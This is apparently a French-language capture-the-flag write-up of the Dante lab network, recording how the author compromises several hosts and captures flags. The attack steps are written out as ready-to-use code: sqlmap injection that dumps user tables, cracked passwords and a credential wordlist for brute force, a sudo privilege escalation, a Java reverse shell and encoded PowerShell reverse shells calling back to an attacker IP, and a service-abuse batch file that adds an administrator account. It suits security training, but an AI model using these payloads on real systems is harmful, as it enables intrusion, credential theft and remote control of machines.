Welcometomyblog
egre55
admin
myspace7
SamsungOctober102030
WestminsterOrange17
P@ssw0rd123!
```

```js
10.10.110.100 DANTE-WEB-NIX01    [pwned!]
172.16.1.5    DANTE-SQL01        
172.16.1.10   DANTE-NIX02        [pwned!]
172.16.1.12   DANTE-NIX07        
172.16.1.13   DANTE-WS01         [pwned!]
172.16.1.17   DANTE-NIX03        [pwned!]
172.16.1.19   DANTE-JENKINS      
172.16.1.20   DANTE-DC01         [pwned!]
172.16.1.100  DANTE-WEB-NIX01    [Pwned!]
172.16.1.101  DANTE-WS02         [pwned!]
172.16.1.102  DANTE-WS03         
172.16.2.5    DANTE-DC02         [pwned!]
172.16.2.101  DANTE-ADMIN-NIX05  
172.16.2.6    DANTE-ADMIN-NIX06  [pwned!]
```
# 172.16.1.12 : DANTE-NIX07

## Enumeration des ports ouverts et services

```js
nmap -sV -sC 172.16.1.12 -Pn
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-10 13:16 +0000
Nmap scan report for 172.16.1.12
Host is up (5.5s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (ProFTPD) [::ffff:172.16.1.12]
|     Invalid command: try being more creative
|     Invalid command: try being more creative
|   NULL: 
|_    220 ProFTPD Server (ProFTPD) [::ffff:172.16.1.12]
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 22:cc:a3:e8:7d:d5:65:6d:9d:ea:17:d1:d9:1b:32:cb (RSA)
|   256 04:fb:b6:1a:db:95:46:b7:22:13:61:24:76:80:1e:b8 (ECDSA)
|_  256 ae:c4:55:67:6e:be:ba:65:54:a3:c3:fc:08:29:24:0e (ED25519)
80/tcp   open  http     Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
|_http-server-header: Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3
| http-title: Welcome to XAMPP
|_Requested resource was http://172.16.1.12/dashboard/
443/tcp  open  ssl/http Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3
| http-title: Welcome to XAMPP
|_Requested resource was https://172.16.1.12/dashboard/
| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2004-10-01T09:10:30
|_Not valid after:  2010-09-30T09:10:30
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql    MariaDB 10.3.24 or later (unauthorized)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.99%I=7%D=7/10%Time=6A50F0D3%P=x86_64-pc-linux-gnu%r(NULL
SF:,33,"220\x20ProFTPD\x20Server\x20\(ProFTPD\)\x20\[::ffff:172\.16\.1\.12
SF:\]\r\n")%r(GenericLines,8F,"220\x20ProFTPD\x20Server\x20\(ProFTPD\)\x20
SF:\[::ffff:172\.16\.1\.12\]\r\n500\x20Invalid\x20command:\x20try\x20being
SF:\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20m
SF:ore\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.51 seconds
```

## HTTP Enum

![](/assets/IMG-20260714172133573.png)

## Directory Fuzzing: /blog

![](/assets/IMG-20260714172133607.png)

## Enumeration du site Web

![](/assets/IMG-20260714172133655.png)

Ceci me fait penser au `SQLInjection`

## Exploitation

```js
sqlmap -u "http://172.16.1.12/blog/single.php?id=6" --dbs --batch
```

![](/assets/IMG-20260714172133700.png)
```js
sqlmap -u "http://172.16.1.12/blog/single.php?id=6" --dbms=mysql -D flag -T flag --dump --batch
```

![](/assets/IMG-20260714172133745.png)

### [Flag16 : DANTE{wHy_y0U_n0_s3cURe?!?!}]

```js
sqlmap -u "http://172.16.1.12/blog/single.php?id=6" --dbms=mysql -D blog_admin_db --tables --batch
```

![](/assets/IMG-20260714172133783.png)

Dumper le contenu de la Tables users

```js
sqlmap -u "http://172.16.1.12/blog/single.php?id=6" --dbms=mysql -D blog_admin_db -T membership_users --dump --batch
```

![](/assets/IMG-20260714172133823.png)


```js
admin : 21232f297a57a5a743894a0e4a801fc3
ben : 442179ad1de9c25593cabf625c0badb7 : ben@dante.htb
egre55 : d6501933a2e0ea1f497b87473051417f : egre55@htb.com
```

## Apres Avoir  cracker le mot de passe

```js
ben : Welcometomyblog
egre55 : egre55
admin : admin
```

## Connection FTP

![](/assets/IMG-20260714172133873.png)



## Connection ssh reussit avec les meme creds

![](/assets/IMG-20260714172133917.png)

### [Flag17 : DANTE{Pretty_Horrific_PH4IL!}]

## Privesc vers root

![](/assets/IMG-20260714172133956.png)

Payload : `sudo -u#-1 /bin/bash`

### [Flag18 : DANTE{sudo_M4k3_me_@_Sandwich}]


```js
10.10.110.100 DANTE-WEB-NIX01    [pwned!]
172.16.1.5    DANTE-SQL01        
172.16.1.10   DANTE-NIX02        [pwned!]
172.16.1.12   DANTE-NIX07        [pwned!]
172.16.1.13   DANTE-WS01         [pwned!]
172.16.1.17   DANTE-NIX03        [pwned!]
172.16.1.19   DANTE-JENKINS      
172.16.1.20   DANTE-DC01         [pwned!]
172.16.1.100  DANTE-WEB-NIX01    [Pwned!]
172.16.1.101  DANTE-WS02         [pwned!]
172.16.1.102  DANTE-WS03         
172.16.2.5    DANTE-DC02         [pwned!]
172.16.2.101  DANTE-ADMIN-NIX05  
172.16.2.6    DANTE-ADMIN-NIX06  [pwned!]
```


---

# 172.16.1.19 : JENKINS
## Enumeration des ports et services

```js
nmap -sV -sC 172.16.1.19 -Pn
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-12 12:46 +0000
Nmap scan report for 172.16.1.19
Host is up (4.8s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-server-header: Jetty(9.4.27.v20200227)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: Host: 127.0.0.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.92 seconds
```

## HTTP Enumeration (8080)

![](/assets/IMG-20260714172133996.png)

#### Jenkins Jetty 9.4.27.v20200227

Apres quelque recherche j'ai trouver que la version de ce `Jenkins` est vuln au CVE `CVE-2019-17638`

La **CVE-2019-17638** est une faille de sécurité critique (score CVSS de **9.4**) qui touche le serveur web Jetty intégré à Jenkins.
Mais `Helas` j'ai pas pu exploiter la faille par manque de Creds
## Enumeration des Users
Creds Trouver dans le deuxieme controlleur de domaine dans le sous reseau 172.16.2.5

![](/assets/IMG-20260714172134041.png)


![](/assets/IMG-20260714172134100.png)


### [Flag19 : DANTE{to_g0_4ward_y0u_mus7_g0_back}]


## Reverse Shell

```js
String host="10.10.14.53";
int port=8800;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();
  Thread.sleep(50);
  try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();
```


![](/assets/IMG-20260714172134135.png)

![](/assets/IMG-20260714172134176.png)

## Privilege Escalation

![](/assets/IMG-20260714172134223.png)

ubuntu version 20.04
![](/assets/IMG-20260714172134293.png)

### [Flag20 : DANTE{g0tta_<3_ins3cur3_GROupz!}]


```js
10.10.110.100 DANTE-WEB-NIX01    [pwned!]
172.16.1.5    DANTE-SQL01        
172.16.1.10   DANTE-NIX02        [pwned!]
172.16.1.12   DANTE-NIX07        [pwned!]
172.16.1.13   DANTE-WS01         [pwned!]
172.16.1.17   DANTE-NIX03        [pwned!]
172.16.1.19   DANTE-JENKINS      [pwned!]
172.16.1.20   DANTE-DC01         [pwned!]
172.16.1.100  DANTE-WEB-NIX01    [Pwned!]
172.16.1.101  DANTE-WS02         [pwned!]
172.16.1.102  DANTE-WS03         
172.16.2.5    DANTE-DC02         [pwned!]
172.16.2.101  DANTE-ADMIN-NIX05  
172.16.2.6    DANTE-ADMIN-NIX06  [pwned!]
```

---
# 172.16.1.101: WS02

## Enumeration des ports et services

```js
nmap -sV -sC 172.16.1.101 -Pn
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-13 08:45 +0000
Nmap scan report for 172.16.1.101
Host is up (3.4s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 0.9.60 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DANTE-WS02, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:25:65:03 (unknown)
| smb2-time: 
|   date: 2026-07-13T08:45:49
|_  start_date: N/A
|_clock-skew: -18s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.65 seconds
```


## Enumeratin FTP

## Wordlists

```js
asmith:Princess1
smoggat:Summer2019
tmodle:P45678!
ccraven:Password1
kploty:Teacher65
jbercov:4567Holiday1
whaguey:acb123
dcamtan:WorldOfWarcraft67
tspadly:RopeBlackfieldForwardslash
ematlis:JuneJuly1TY
fglacdon:FinalFantasy7
tmentrso:65RedBalloons
dharding:WestminsterOrange5
smillar:MarksAndSparks91
bjohnston:Bullingdon1
iahmed:Sheffield23
plongbottom:PowerfixSaturdayClub777
jcarrot:Tanenbaum0001
lgesley:SuperStrongCantForget123456789
james:Toyota
shaun:password
balthazar:TheJoker12345!
margaret:Welcome1!2@3#
frank:TractorHeadtorchDeskmat
frank:STARS5678FORTUNE401
admin:Password6543
ben:Welcometomyblog
egre55:egre55
admin:admin
jbercov:myspace7
Administrator:4c827b7074e99eefd49d05872185f7f8 (NTLM hash - DANTE.ADMIN)
Admin_129834765:SamsungOctober102030
```

```js
hydra -C paire_worldlist.txt 172.16.1.101 ftp -f
```

![](/assets/IMG-20260714172134347.png)

```js
dharding : WestminsterOrange5
```

![](/assets/IMG-20260714172134390.png)


## Enumeration SMB
## Indice
```js
Dido,
I've had to change your account password due to some security issues we have recently become aware of

It's similar to your FTP password, but with a different number (ie. not 5!)

Come and see me in person to retrieve your password.

thanks,
James%
```

Connexion du SMB avec une nouvelle wordlist

```js
nxc smb 172.16.1.101 -u 'dharding' -p  '172.16.1.101_pass.txt'
```

![](/assets/IMG-20260714172134439.png)

Creds Trouver

```js
dharding : WestminsterOrange17
```

![](/assets/IMG-20260714172134487.png)

## Connexion via evil-winrm

```js
evil-winrm -u dharding -i 172.16.1.101
```

![](/assets/IMG-20260714172134525.png)

### [Flag21 : DANTE{superB4d_p4ssw0rd_FTW}]

## Privesc

Decouverte d'element assez interressant
![](/assets/IMG-20260714172134581.png)

```js
*Evil-WinRM* PS C:\Users\dharding\DEsktop> Get-Service IObitUnSvr

Status   Name               DisplayName
------   ----               -----------
Stopped  IObitUnSvr         IObit Uninstaller Service

```

## abus de permissions sur les services Windows

#### Arreter le service 
```js
sc.exe stop IObitUnSvr
```


#### Preparer l'exploit
```js
@echo off
net user pwned P@ssw0rd123! /add
net localgroup Administrators pwned /add
net localgroup "Remote Desktop Users" pwned /add
```

L'exploit consiste a creer un user et le mettre dans le group administrator

#### Importer l'exploit 

```js
Invoke-WebRequest -Uri "10.10.14.53/add_admin.bat" -OutFile "add_admin.bat"
```
#### Chergement de l'exploit

```js
sc.exe config IObitUnSvr binPath="cmd.exe /c c:\temp\add_admin.bat"
```

#### Relancement de l'exploit

```js
sc.exe start IObitUnSvr
```

#### Execution de l'exploit

```js
*Evil-WinRM* PS C:\temp> net user pwned
User name                    pwned
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            13/07/2026 12:14:00
Password expires             24/08/2026 12:14:00
Password changeable          13/07/2026 12:14:00
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Desktop Users
                             *Users
Global Group memberships     *None
The command completed successfully.

```


### [Flag22 : DANTE{Qu0t3_I_4M_secure!_unQu0t3}]

```js
172.16.1.5   DANTE-SQL01
172.16.1.10  DANTE-NIX02     [pwned!]
172.16.1.12  DANTE-NIX07     [pwned!]
172.16.1.13  DANTE-WS01      [pwned!]
172.16.1.17  DANTE-NIX03     [pwned!]
172.16.1.19  DANTE-JENKINS   [pwned!]
172.16.1.20  DANTE-DC01      [pwned!]
172.16.1.100 DANTE-WEB-NIX01 [Pwned!]
172.16.1.101 DANTE-WS02      [pwned!]
172.16.1.102 DANTE-WS03      
172.16.2.5   DANTE-DC02      [pwned!]
```
---
# 172.16.1.102: DANTE-WS03

## Enumeration des ports et services
```js
nmap -sV -sC 172.16.1.102 -Pn
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-13 08:45 +0000
Nmap scan report for 172.16.1.102
Host is up (0.75s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.0)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.0
|_http-title: Dante Marriage Registration System :: Home Page
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.0)
| ssl-cert: Subject: commonName=localhost/organizationName=TESTING CERTIFICATE
| Subject Alternative Name: DNS:localhost
| Not valid before: 2022-06-24T01:07:25
|_Not valid after:  2022-12-24T01:07:25
|_http-title: Dante Marriage Registration System :: Home Page
| tls-alpn: 
|   h2
|_  http/1.1
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.0
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MySQL (unauthorized)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DANTE-WS03
|   NetBIOS_Domain_Name: DANTE-WS03
|   NetBIOS_Computer_Name: DANTE-WS03
|   DNS_Domain_Name: DANTE-WS03
|   DNS_Computer_Name: DANTE-WS03
|   Product_Version: 10.0.19041
|_  System_Time: 2026-07-13T08:46:49+00:00
|_ssl-date: 2026-07-13T08:47:00+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DANTE-WS03
| Not valid before: 2026-07-11T09:06:48
|_Not valid after:  2027-01-10T09:06:48
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DANTE-WS03, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:c9:21:25 (unknown)
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-time: 
|   date: 2026-07-13T08:46:45
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.81 seconds
```

![](/assets/IMG-20260714172134630.png)

Vuln a une RCE
## POC
https://github.com/ricardojoserf/omrs-rce-exploit/blob/main/exploit.py

![](/assets/IMG-20260714172134679.png)

## Reverse shell
![](/assets/IMG-20260714172134721.png)

![](/assets/IMG-20260714172134765.png)

### [Flag23: DANTE{U_M4y_Kiss_Th3_Br1d3}]

## Privesc

![](/assets/IMG-20260714172134814.png)

nous allons utiliser `JuicePotato`  

```js
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

```js
exploit.exe -c"cmd /c whoami"
```

![](/assets/IMG-20260714172134869.png)

![](/assets/IMG-20260714172134908.png)

### [Flag24 : DANTE{D0nt_M3ss_With_MinatoTW}]

```js
10.10.110.100 DANTE-WEB-NIX01    [pwned!]
172.16.1.5    DANTE-SQL01       
172.16.1.10   DANTE-NIX02        [pwned!]
172.16.1.12   DANTE-NIX07        [pwned!]
172.16.1.13   DANTE-WS01         [pwned!]
172.16.1.17   DANTE-NIX03        [pwned!]
172.16.1.19   DANTE-JENKINS      [pwned!]
172.16.1.20   DANTE-DC01         [pwned!]
172.16.1.100  DANTE-WEB-NIX01    [Pwned!]
172.16.1.101  DANTE-WS02         [pwned!]
172.16.1.102  DANTE-WS03         [pwned!]
172.16.2.5    DANTE-DC02         [pwned!]
172.16.2.101  DANTE-ADMIN-NIX05  [pwned!]
172.16.2.6    DANTE-ADMIN-NIX06  [pwned!]
```

--- 

# 172.16.1.5 : DANTE-SQL01

## Enumeration des ports ouverts et services

```js
nmap -sV -sC 172.16.1.5
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-10 11:26 +0000
Stats: 0:04:13 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 94.12% done; ETC: 11:31 (0:00:07 remaining)
Nmap scan report for 172.16.1.5
Host is up (0.82s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp             44 Jan 08  2021 flag.txt
111/tcp  open  rpcbind?
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|_  100005  1,2,3       2049/udp6  mountd
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   172.16.1.5\SQLEXPRESS: 
|     Target_Name: DANTE-SQL01
|     NetBIOS_Domain_Name: DANTE-SQL01
|     NetBIOS_Computer_Name: DANTE-SQL01
|     DNS_Domain_Name: DANTE-SQL01
|     DNS_Computer_Name: DANTE-SQL01
|_    Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-07-10T02:04:52
|_Not valid after:  2056-07-10T02:04:52
| ms-sql-info: 
|   172.16.1.5\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|_    Clustered: false
|_ssl-date: 2026-07-10T11:29:15+00:00; 0s from scanner time.
2049/tcp open  mountd       1-3 (RPC #100005)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-10T11:29:00
|_  start_date: 2026-07-10T02:04:42
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DANTE-SQL01, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:a1:22:e6 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 265.83 seconds
```

## FTP Enumeration

```js
ftp 172.16.1.5
```

![](/assets/IMG-20260714172134949.png)

Recuperation d'un ficher flag.txt

### [Flag25 : DANTE{Ther3s_M0r3_to_pwn_so_k33p_searching!}]

## SMB Enumeration

```js
Host script results:
| smb2-time: 
|   date: 2026-07-10T11:29:00
|_  start_date: 2026-07-10T02:04:42
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DANTE-SQL01, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:a1:22:e6 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

![](/assets/IMG-20260714172134998.png)

Connexion anonyme refuser 
*  soit Besoin d'un mot de passe valide
* soit l'utilisateur guest est desactiver

```js
Domaine name : DANTE-SQL01
```

connection au compte `mssql` avec creds trouverdans le `172.16.2.6`

![](/assets/IMG-20260714172135047.png)

## Reverse Shell via le mssql

```js
EXEC xp_cmdshell 'cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQAzACIALAA0ADQAMAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';
```

![](/assets/IMG-20260714172135091.png)


### [Flag26: DANTE{Mult1ple_w4Ys_in!}]

## Privesc avec Juice Potato

![](/assets/IMG-20260714172135134.png)

```js
./potato.exe -c "cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQAzACIALAA0ADQAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```


![](/assets/IMG-20260714172135185.png)


### [Flag27: DANTE{Ju1cy_pot4t03s_in_th3_wild}]
---

```js
10.10.110.100 DANTE-WEB-NIX01    [pwned!]
172.16.1.5    DANTE-SQL01        [pwned!]
172.16.1.10   DANTE-NIX02        [pwned!]
172.16.1.12   DANTE-NIX07        [pwned!]
172.16.1.13   DANTE-WS01         [pwned!]
172.16.1.17   DANTE-NIX03        [pwned!]
172.16.1.19   DANTE-JENKINS      [pwned!]
172.16.1.20   DANTE-DC01         [pwned!]
172.16.1.100  DANTE-WEB-NIX01    [Pwned!]
172.16.1.101  DANTE-WS02         [pwned!]
172.16.1.102  DANTE-WS03         [pwned!]
172.16.2.5    DANTE-DC02         [pwned!]
172.16.2.101  DANTE-ADMIN-NIX05  [pwned!]
172.16.2.6    DANTE-ADMIN-NIX06  [pwned!]
```

# Certification

![](/assets/IMG-20260714172135242.png)